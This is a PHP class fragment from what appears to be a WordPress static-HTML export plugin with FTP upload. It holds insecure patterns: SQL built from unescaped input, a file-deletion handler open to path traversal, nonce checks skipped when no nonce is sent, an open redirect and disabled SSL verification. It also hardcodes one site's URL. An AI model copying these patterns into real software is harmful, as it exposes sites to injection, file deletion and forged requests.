	public function rc_path_to_dot($url, $custom_url=false, $full_site = false){
		$middle_path = str_replace(home_url(), '', $url);
		if ( $custom_url && strpos($url, home_url()) == false ) {
			$middle_path = str_replace('https://fineartofdecals.com/goodies/', '', $url);

			if (!$full_site) {
				$middle_path = "";
			}
		}
		$middle_path = str_replace( basename($url), '', $middle_path);
		$middle_path = str_replace( '//', '/', $middle_path);
		$middle_path = ltrim($middle_path, '/');

		$middle_path = explode('/', $middle_path);

		$p = './';
		if (!empty($middle_path)) {
			for ($i=1; $i < count($middle_path); $i++) { 
				$p .= '../';
			}
		}

		return $p;
	}
	public function host($url) {
	  $result = parse_url($url);
	  return 'https://fineartofdecals.com/goodies/';
	}
	public function rc_get_url_middle_path($url, $custom_url = false, $full_site = false){
		$middle_path = str_replace(home_url(), '', $url);
		if ( $custom_url && strpos($url, home_url()) == false ) {
			$middle_path = str_replace('https://fineartofdecals.com/goodies/', '', $url);
			if (!$full_site) {
				$middle_path = "";
			}
		}
		$middle_path = str_replace( basename($url), '', $middle_path);
		$middle_path = str_replace( '//', '/', $middle_path);
		$middle_path = ltrim($middle_path, '/');

		return $middle_path;
	}

	public function middle_path_for_filename($url='')
	{
		$middle_path = $this->rc_get_url_middle_path($url);
		$middle_path_slash_cut = rtrim($middle_path, '/') ;

		$path_dir = explode( '/', $middle_path_slash_cut);

		$path_dir_dash = "";

		/*if (strpos($url, '-child') !== false) {
			if (count($path_dir) > 2) {
				for ($i=1; $i < count($path_dir); $i++) { 
					$path_dir_dash .= $path_dir[$i] . '-';
				}
			}
		} else {*/
			if (count($path_dir) > 2) {
				for ($i=2; $i < count($path_dir); $i++) { 
					$path_dir_dash .= $path_dir[$i] . '-';
				}
			}
		//}


		//$path_dir_dash = rtrim($path_dir_dash, '-');

		return $path_dir_dash;
	}

	public function rc_is_link_already_generated($url='')
	{
		global $wpdb;
		$results = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}export_page_to_html_logs WHERE path LIKE '{$url}'");

		if (!empty($results)) {
			return true;
		}
		return false;
	}


		public function if_is_running_html_exporting_process(){
			//$post = $_POST['post'];
			$post2 = isset($_POST['post2']) ? $_POST['post2'] : "";
			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";

			$html_export_process = get_option('rc_export_pages_as_html_task');
			$is_zip_downloaded = get_option('rc_is_export_pages_zip_downloaded');
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}

			if ($html_export_process == "running") {
				global $wpdb;

				$logs = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}export_page_to_html_logs ORDER BY id DESC LIMIT 1");

				$log_data = isset($logs) && !empty($logs) ? $logs : "0";
				$log_last_id = $log_data !== "0" ? $log_data[0]->id : "0";

				$ftp_enabled = get_option('rc_export_html_ftp_upload_enabled');

				$uploading_to_ftp = false;
				if ($ftp_enabled == 'yes') {
					$uploading = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}export_page_to_html_logs WHERE type = 'uploaded_to_ftp' ");

					if (empty($uploading)) {
						$uploading_to_ftp = true;
					}
				}

				
				if ($uploading_to_ftp) {
					echo json_encode(array('success' => 'true', 'status' => 'success', 'export_process' => 'uploading_to_ftp', 'is_zip_downloaded' => 'yes', 'log_id' => $log_last_id, 'response' => $log_data));
				}
				else{
					echo json_encode(array('success' => 'true', 'status' => 'success', 'export_process' => 'running', 'is_zip_downloaded' => 'yes', 'log_id' => $log_last_id, 'response' => $log_data));
				}
				
			} 
			else{
				$response = "";

				global $wpdb;
				$zip_file_link = $wpdb->get_results("SELECT path FROM {$wpdb->prefix}export_page_to_html_logs WHERE type = 'created_zip_file' ");


				$zip_link = "";
				if (!empty($zip_file_link)) {
					$zip_link = $zip_file_link[0]->path;
				}

				$uploaded_to_ftp = false;
				if ($ftp_enabled == 'yes') {
					$uploading = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}export_page_to_html_logs WHERE type = 'uploaded_to_ftp' ");

					if (!empty($uploading)) {
						$uploaded_to_ftp = true;
					}
				}

				if ($uploaded_to_ftp && $html_export_process == "completed" && $is_zip_downloaded == "no") {
					echo json_encode(array('success' => 'true', 'status' => 'success', 'export_process' => 'ftp_completed', 'is_zip_downloaded' => 'no', 'response' => $response, 'zip_file_link' => $zip_link));
				} 
				
				elseif ($html_export_process == "completed" && $is_zip_downloaded == "no") {
					echo json_encode(array('success' => 'true', 'status' => 'success', 'export_process' => 'completed', 'is_zip_downloaded' => 'no', 'response' => $response, 'zip_file_link' => $zip_link));
				} 
				else {
					echo json_encode(array('success' => 'true', 'status' => 'success', 'export_process' => 'completed', 'is_zip_downloaded' => 'yes', 'response' => $response));
				}
				
			}
	
			
		
			die();
		}


	public function rc_redirect_for_export_page_as_html() {
	    if (isset($_GET['rc_exported_zip_file'])) {
	        $url = urldecode($_GET['rc_exported_zip_file']);
	        update_option('rc_is_export_pages_zip_downloaded', 'yes');
	        wp_redirect($url);
		    exit;
	   }
	}

	public function ltrim_and_rtrim($backend_file_url_full='', $sym = "")
	{
		if (empty($sym)) {
			$backend_file_url_full = ltrim($backend_file_url_full, "'");
			$backend_file_url_full = rtrim($backend_file_url_full, "'");
			$backend_file_url_full = ltrim($backend_file_url_full, '"');
			$backend_file_url_full = rtrim($backend_file_url_full, '"');

		}
		else {
			$backend_file_url_full = ltrim($backend_file_url_full, $sym);
			$backend_file_url_full = rtrim($backend_file_url_full, $sym);
		}
		return $backend_file_url_full;
	}

	public function ftp_putAll($conn_id, $src_dir, $dst_dir) {
		if ($this->is_cancel_command_found()) {
			return false;
		}
	    $d = dir($src_dir);
	    while($file = $d->read()) { // do this for each file in the directory
	        if ($file != "." && $file != "..") { // to prevent an infinite loop
	            if (is_dir($src_dir."/".$file)) { // do the following if it is a directory

	                if (!@ftp_chdir($conn_id, $dst_dir."/".$file)) {
	                    ftp_mkdir($conn_id, $dst_dir."/".$file); // create directories that do not yet exist
	                }
	                $this->ftp_putAll($conn_id, $src_dir."/".$file, $dst_dir."/".$file); // recursive part
	            } else {

	            	$this->update_export_log($dst_dir."/".$file, 'file_uploaded_to_ftp');
	                $upload = ftp_put($conn_id, $dst_dir."/".$file, $src_dir."/".$file, FTP_BINARY); // put the files
	            }
	        }
	    }
	    $d->close();
	}

	function ftp_mksubdirs($ftpcon,$ftpbasedir,$ftpath){
	   @ftp_chdir($ftpcon, $ftpbasedir); // /var/www/uploads
	   $parts = array_filter(explode('/',$ftpath)); // 2013/06/11/username
	   foreach($parts as $part){
	      if(!@ftp_chdir($ftpcon, $part)){
	         ftp_mkdir($ftpcon, $part);
	         //ftp_chmod($ftpcon, 0775, $part);
	         ftp_chdir($ftpcon, $part);
	      }
	   }
	}

	public function rc_if_images_directory_found($ftpConn='', $directory='')
	{
		$lists = ftp_mlsd($ftpConn, $directory);
		if (!empty($lists)) {
			foreach ($lists as $key => $file) {
				if ($file['type']=='dir'&&$file['name']=='images') {
					return true;
					break;
				}
			}
		}
		return false;
	}

	public function rc_export_html_general_admin_notice(){

		$html_export_process = get_option('rc_export_pages_as_html_task');
		$is_zip_downloaded = get_option('rc_is_export_pages_zip_downloaded');

		if ($html_export_process == 'running' && $is_zip_downloaded == 'no') {
	        echo '<div class="notice notice-warning is-dismissible export-html-notice">
	             <p>HTML exporting task has been running... <a href="options-general.php?page=export-wp-page-to-html">View details</a></p>
	         </div>';
		} 
		elseif ($html_export_process == 'completed' && $is_zip_downloaded == 'no') {
			 echo '<div class="notice notice-success is-dismissible export-html-notice">
	             <p>HTML exporting task has been completed. <a href="options-general.php?page=export-wp-page-to-html">View results</a></p>
	         </div>';
		}
	}


		public function delete_exported_zip_file(){
			//$post = $_POST['post'];
			$file_name = isset($_POST['file_name']) ? $_POST['file_name'] : "";
			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}


            $upload_dir = wp_upload_dir()['basedir'] . '/exported_html_files/';
			
			$response = unlink($upload_dir.$file_name);;
	
			
			echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $response));
		
			die();
		}
	

		public function export_custom_url(){
			//$post = $_POST['post'];
			$custom_link = isset($_POST['custom_link']) ? $_POST['custom_link'] : "";
			$replace_all_url = isset($_POST['replace_all_url']) ? $_POST['replace_all_url'] : "";
			$skip_image_src_url = isset($_POST['skip_image_src_url']) ? $_POST['skip_image_src_url'] : "";
			$full_site = isset($_POST['full_site']) ? $_POST['full_site'] : "";

			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}

			update_option('rc_skip_image_src_url', $skip_image_src_url);

			$ftp = isset($_POST['ftp']) ? $_POST['ftp'] : 'false';
			$path = isset($_POST['path']) ? $_POST['path'] : '';
			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}

			global $wpdb;

			$upload_dir = wp_upload_dir()['basedir'];
			$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");
			$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');

			$ftp_status = get_option('rc_export_html_ftp_connection_status');

			if ($ftp !== 'false' && $ftp_status == 'connected') {
				update_option('rc_export_html_ftp_upload_enabled', 'yes');
				/*$datas = get_option('rc_export_html_ftp_data');
				$datas->path2 = $path;
				update_option('rc_export_html_ftp_data', $datas);		*/
			}
			else{
				update_option('rc_export_html_ftp_upload_enabled', 'no');
			}

 	
			$receive_email = isset($_POST['receive_email']) && sanitize_key($_POST['receive_email']) == "true" ? true : false;
 			$email_lists = isset($_POST['email_lists']) ? $_POST['email_lists'] : "";

 			if ($receive_email) {
 				wp_schedule_single_event( time() , 'rc_export_new_event2', array( $custom_link, $replace_all_url, $email_lists, $full_site, $path ) );
 			} else {
 				wp_schedule_single_event( time() , 'rc_export_new_event2', array( $custom_link, $replace_all_url, 'no', $full_site, $path ) );
 			}
			


			
			echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => 'task running'));
			
		
			die();
		}

		public function add_cron_job_to_start_html_exporting_for_save_post($post_id = 0, $path=''){
			$permalink = get_permalink($post_id);
			$custom_link = !empty($permalink) ? $permalink : "";
			$replace_all_url = false;
			$full_site = false;

/*			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}*/
 			/*$datas = (object) array(
 				'permalink' 	=> get_permalink($post_id),
 				'title' 		=> '',
 				'page_id' 		=> $post_id,
 				'post_name' 	=> basename(get_permalink($post_id)),
 				'is_homepage' 	=> false,
 				'is_full_site' 	=> false,
 				'is_all_links' 	=> true,
 			);*/

			$ftp = 'true';
			$path = !empty($path) ? $path : '';

			global $wpdb;

			$upload_dir = wp_upload_dir()['basedir'];
			$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");
			$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');

			$ftp_status = get_option('rc_export_html_ftp_connection_status');

			if ($ftp !== 'false' && $ftp_status == 'connected') {
				update_option('rc_export_html_ftp_upload_enabled', 'yes');
				/*$datas = get_option('rc_export_html_ftp_data');
				$datas->path2 = $path;
				update_option('rc_export_html_ftp_data', $datas);		*/
			}
			else{
				update_option('rc_export_html_ftp_upload_enabled', 'no');
			}

 	
			$receive_email = false;
 			$email_lists = "";

 			wp_clear_scheduled_hook( 'rc_export_new_event2' );
 			if ($receive_email) {
 				wp_schedule_single_event( time()+2 , 'rc_export_new_event2', array( $custom_link, $replace_all_url, $email_lists, $full_site, $path ) );
 			} else {
 				wp_schedule_single_event( time()+2 , 'rc_export_new_event2', array( $custom_link, $replace_all_url, 'no', $full_site, $path ) );
 			}
			
			return json_encode(array('success' => 'true', 'status' => 'success', 'response' => 'task running'));

		}

	public function xcurl($url,$print=false,$ref=null,$post=array(),$ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0") {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
        if(!empty($ref)) {
            curl_setopt($ch, CURLOPT_REFERER, $ref);
        }
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if(!empty($ua)) {
            curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        }
        if(!empty($post)){
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);    
        }
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $output = curl_exec($ch);
        curl_close($ch);
        if($print) {
            print($output);
        } else {
            return $output;
        }
    }

    public function get_site_data_by_url($url='')
    {
    	
    	$html = file_get_contents($url);

    	if (!$html) {
    		$html = $this->xcurl($url);
    	}

    	return $html;
    }

    public function is_url_already_read($url='')
    {
    	global $wpdb;
    	$result = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}export_page_to_html_logs WHERE path = '{$url}'");

    	if (count($result) >= 1) {
    		return true;
    	}

    	return false;
    }



    	public function rc_check_ftp_connection_status(){
    		//$post = $_POST['post'];
    		$ftp_data = isset($_POST['ftp_data']) ? $_POST['ftp_data'] : "";
    		$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
    
    		if(!empty($nonce)){
    			if(!wp_verify_nonce( $nonce, "rc-nonce" )){
    				echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
    
    				die();
    			}
    		}

    		$ftp_data = isset($_POST['ftp_data']) ? $_POST['ftp_data'] : "";
			$ftp_data = stripcslashes($ftp_data);
			$ftp_data = json_decode($ftp_data);

			$host = $user = $pass = $path = "";
			if (isset($ftp_data->host)) {
				$host = $ftp_data->host;
			}
			if (isset($ftp_data->user)) {
				$user = $ftp_data->user;
			}
			if (isset($ftp_data->pass)) {
				$pass = $ftp_data->pass;
			}
			if (isset($ftp_data->path)) {
				$path = $ftp_data->path;
			}

			$connected = false;

			if (function_exists('ftp_connect') && function_exists('ftp_login')) {

				if (!empty($host) && !empty($user) && !empty($pass)) {
					$ftpConn = ftp_connect($host);
					$login = ftp_login($ftpConn,$user,$pass);

					if ($ftpConn && $login) {
						$connected = true;

						update_option('rc_export_html_ftp_connection_status', 'connected');
						update_option('rc_export_html_ftp_data', $ftp_data);
					}
					else{
						update_option('rc_export_html_ftp_connection_status', 'not_connected');
						update_option('rc_export_html_ftp_data', $ftp_data);
					}
				}
			}
    
    		$response = $connected;
    
    		
    		echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $response));
    	
    		die();
    	}
    
    public function get_ftp_path_directory($p_path='')
    {
    	$status = get_option('rc_export_html_ftp_connection_status');
    	$ftp_data = get_option('rc_export_html_ftp_data');

    	if ($status == 'connected') {
	    	$host = $user = $pass = $path = "";
			if (isset($ftp_data->host)) {
				$host = $ftp_data->host;
			}
			if (isset($ftp_data->user)) {
				$user = $ftp_data->user;
			}
			if (isset($ftp_data->pass)) {
				$pass = $ftp_data->pass;
			}
			if (isset($ftp_data->path)) {
				$path = $ftp_data->path;
			}

			if (!empty($p_path)) {
				$path = $p_path;
			}

			if (function_exists('ftp_connect') && function_exists('ftp_login')) {

				if (!empty($host) && !empty($user) && !empty($pass)) {
					$ftpConn = ftp_connect($host);
					$login = ftp_login($ftpConn,$user,$pass);

					if ($ftpConn && $login) {
						//@ftp_chdir($ftpConn, $path);
						$u['path'] = $this->normalizePath($path);//ftp_pwd($ftpConn);

						$lists = ftp_mlsd($ftpConn, $path);
						$list = array();
						$list_d = array();
						if (!empty($lists)) {
							foreach ($lists as $key => $value) {
								if ($value['type'] == 'dir') {
									$list[] = $value['name'];
								}
								if ($value['type'] == 'pdir') {
									$list_d[] = $value['name'];
								}
							}
						}

						$all_lists = array_merge($list_d, $list);
						$u['lists'] = $all_lists;
						return $u;
					}
				}
			}
		}
    }


    	public function rc_html_export_get_dir_path(){
    		//$post = $_POST['post'];
    		$path = isset($_POST['path']) ? $_POST['path'] : "";
    		$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
    
    		if(!empty($nonce)){
    			if(!wp_verify_nonce( $nonce, "rc-nonce" )){
    				echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
    
    				die();
    			}
    		}

    		$dirs = $this->get_ftp_path_directory($path);
    		$lists = '<span><span style="font-weight: bold;">Current path: </span><span class="ftp_current_path">/' . $this->get_absolute_path($dirs['path']).'</span></span><ul class="list-group">';
	        if(isset($dirs['lists'])&&!empty($dirs['lists'])){
	            foreach ($dirs['lists'] as $key => $dir) {
	            	if (strpos($dir, '..')!==false) {
	                	$lists .= '<li class="list-group-item" dir_path="'.$dirs['path'].'/'.$dir.'">'.$dir.'</li>';
	            	}
	            	else{
	            		$lists .= '<li class="list-group-item" dir_path="'.$dirs['path'].'/'.$dir.'"><span class="dir_png"></span>'.$dir.'</li>';
	            	}

	            }
	        }

	        $lists .= '</ul>';
    
    		$response = $lists;
    
    		
    		echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $response));
    	
    		die();
    	}
    
	public function normalizePath($path)
{
    $parts = array();// Array to build a new path from the good parts
    $path = str_replace('\\', '/', $path);// Replace backslashes with forwardslashes
    $path = preg_replace('/\/+/', '/', $path);// Combine multiple slashes into a single slash
    $segments = explode('/', $path);// Collect path segments
    $test = '';// Initialize testing variable
    foreach($segments as $segment)
    {
        if($segment != '.')
        {
            $test = array_pop($parts);
            if(is_null($test))
                $parts[] = $segment;
            else if($segment == '..')
            {
                if($test == '..')
                    $parts[] = $test;

                if($test == '..' || $test == '')
                    $parts[] = $segment;
            }
            else
            {
                $parts[] = $test;
                $parts[] = $segment;
            }
        }
    }
    return implode('/', $parts);
}
public function get_absolute_path($path) {
    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
    $absolutes = array();
    foreach ($parts as $part) {
        if ('.' == $part) continue;
        if ('..' == $part) {
            array_pop($absolutes);
        } else {
            $absolutes[] = $part;
        }
    }
    return implode('/', $absolutes);
}


	public function cancel_rc_html_export_process(){
		//$post = $_POST['post'];
		$post2 = isset($_POST['post2']) ? $_POST['post2'] : "";
		$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";

		if(!empty($nonce)){
			if(!wp_verify_nonce( $nonce, "rc-nonce" )){
				echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));

				die();
			}
		}

		$this->update_export_log('', 'cancel_export_process');
		//update_option('html_export_cancel', 'yes');
		wp_clear_scheduled_hook('rc_export_new_event');
		wp_clear_scheduled_hook('rc_export_new_event2');
		//wp_clear_scheduled_hook('rc_check_for_errors_every_five_minutes');

		update_option('rc_export_pages_as_html_task', 'failed');

		$response = "";

		
		echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $response));
	
		die();
	}

	public function is_cancel_command_found()
	{

		/*$cancel = get_option('html_export_cancel');
		if ($cancel == 'yes') {
			return true;
		}*/
		global $wpdb;
		$result = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}export_page_to_html_logs WHERE type = 'cancel_export_process' ");
		if ($result) {
			return true;
		}
		return false;
	}

	public function get_total_exported_file()
	{
		global $wpdb;
		$result = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}export_page_to_html_logs WHERE type = 'copying' OR type = 'creating_html_file' ");

		return $result;
	}

	public function get_total_uploaded_file()
	{
		global $wpdb;
		$result = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}export_page_to_html_logs WHERE type = 'file_uploaded_to_ftp' ");

		return $result;
	}


	public function rc_get_ftp_uploading_file_count(){
		//$post = $_POST['post'];
		$post2 = isset($_POST['post2']) ? $_POST['post2'] : "";
		$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";

		if(!empty($nonce)){
			if(!wp_verify_nonce( $nonce, "rc-nonce" )){
				echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));

				die();
			}
		}

		$response = "";

		
		echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $response, 'uploaded' => $this->get_total_uploaded_file(), 'total_to_uploaded' => $this->get_total_exported_file() ));
	
		die();
	}

	public function before_basename_change2($basename, $url){
	
		$gop = get_option('rc_url_to_replace');
		return str_replace($gop['find'], $gop['replace'], $basename);
	}

	public function rc_add_cron_interval_five_minutes( $schedules ) { 
	    $schedules['five_minutes'] = array(
	        'interval' => 5,
	        'display'  => esc_html__( 'Every Five Minutes' ), );
	    return $schedules;
	}

	public function rc_check_for_errors_every_five_minutes($value='')
	{
		$args_1 = "one";
		$args_2 = "two";
	    $args = array( $args_1, $args_2 );
	    if (! wp_next_scheduled ( 'rc_check_for_errors_every_five_minutes', $args )) {
	        wp_schedule_event( time(), 'five_minutes', 'rc_check_for_errors_every_five_minutes', $args );
	    }
	}

	public function do_this_every_five_minutes($args_1, $args_2 ) {
		global $wpdb;
		$results = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}export_page_to_html_logs");
		$previous_logs_count = get_option('rc_previous_logs_count', '0');

		if ($results == $previous_logs_count) {
			update_option('rc_expoting_errors_appear', true);
			wp_clear_scheduled_hook( 'rc_check_for_errors_every_five_minutes' );
		}
	    update_option('rc_previous_logs_count', $results);
	}
	
}



